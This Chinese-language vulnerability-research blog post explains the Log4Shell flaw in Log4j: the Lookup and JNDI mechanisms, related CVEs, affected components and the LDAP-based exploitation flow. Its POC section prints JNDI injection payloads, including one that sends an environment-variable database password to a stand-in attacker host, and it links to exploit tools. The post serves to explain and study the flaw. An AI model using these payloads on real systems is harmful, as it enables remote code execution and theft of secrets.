+++
title = 'Log4Shell 漏洞'
date = 2024-05-31T16:04:27+08:00
draft = false
categories = ['漏洞研究']
tags = ['漏洞原理', 'Java', 'Log4j','框架漏洞']
+++

## 前置知识

|术语|描述|
|---|---|
|Log4j|存在漏洞的 Java 库|
|JndiLookup|Log4j 中的漏洞部分|
|Log4Shell|为攻击此漏洞而开发的 exploit|

### Lookup

Lookups 为在 Log4j 配置的任意位置添加值提供了一种方法。它们是实现 StrLookup 接口的一种特殊插件类型。

> [Log4j - Log4j 2 Lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html)
>
> [Log4j2 研究之lookup](https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&mid=2247485584&idx=1&sn=2fad11942986807ea7545f7b8b5d6af8)

### JNDI

JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。

JNDI(Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。

JNDI可访问的现有的目录及服务有：
DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、Windows XP/2000/NT/Me/9x的注册表、RMI、DSML v1&v2、NIS。

> [Java安全之JNDI注入](https://www.cnblogs.com/nice0e3/p/13958047.html)
>
> [JNDI到底是什么？](https://blog.csdn.net/wn084/article/details/80729230)
>
> [深入理解JNDI注入与Java反序列化漏洞利用](https://kingx.me/Exploit-Java-Deserialization-with-RMI.html)

### 相关 CVE

| CVE编号 | 漏洞类型 | 受影响的Log4j版本 | 默认配置下可被利用 |
| --- | --- | --- | --- |
| CVE-2021-44228 | 远程代码执行(RCE) | 2.0至2.14.1 | 是 |
| CVE-2021-45046 | 拒绝服务(DoS)和远程代码执行(RCE) | 2.0至2.15.0 | 否 |
| CVE-2021-4104 | 远程代码执行(RCE) | 1.2* | 否 |
| CVE-2021-45105 | 拒绝服务(DoS) | 2.0-beta9至2.16.0 | 否 |
| CVE-2021-44832 | 远程代码执行(RCE) | 2.0-beta7至2.17.0（不包括安全修复版本2.3.2和2.12.4） | 否 |

> <https://github.com/pentesterland/Log4Shell>

## 远程命令执行漏洞 CVE-2021-44228（Log4Shell）

### 受影响版本

- Apache Log4j 2.x<=2.14.1

### 受影响组件

- Spring-Boot-strater-log4j2
- Apache Struts2
- Apache Solr
- Apache Flink
- Apache Druid
- ElasticSearch
- Flume
- Dubbo
- Redis
- Logstash
- Kafka
- VMvare

### 漏洞说明

> [史上最全 log4j2 远程命令执行漏洞汇总报告](https://cloud.tencent.com/developer/article/1919456)

日志在打印时当遇到 `${` 后，Interpolator 类以 `:` 号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为 key。然后通过 prefix 去找对应的 lookup，通过对应的 lookup 实例调用 lookup 方法，最后将 key 作为参数带入执行。

主要使用 ldap 来构造 payload：

```txt
${jndi:ldap://xxx.xxx.xxx.xxx/exp}
```

最终效果就是通过 jndi 注入，借助 ldap 服务来下载执行恶意 payload，从而执行命令，整个利用流程如图：

![20240531153822](https://gh.iinx.top/https://raw.githubusercontent.com/iselt/ImageBed/main/20240531153822.png)

整个利用流程分两步：

第一步：向目标发送指定 payload，目标对 payload 进行解析执行，然后会通过 ldap 链接远程服务，当 ldap 服务收到请求之后，将请求进行重定向到恶意 java class 的地址。

第二步：目标服务器收到重定向请求之后，下载恶意 class 并执行其中的代码，从而执行系统命令。

### POC

DNSLog

```txt
${jndi:ldap://xxx.dnslog.cn/exp}
```

嵌套语法获取环境变量

```txt
${jndi:ldap://www.attacker.com:1389/${env:MYSQL_PASSWORD}}
```

### EXP

- Burpsuite 插件：[Log4Shell Everywhere](https://portswigger.net/bappstore/186be35f6e0d418eb1f6ecf1cc66a74d)
- [Apache Log4j Remote Code Execution](https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce)

### 流量特征

见 POC
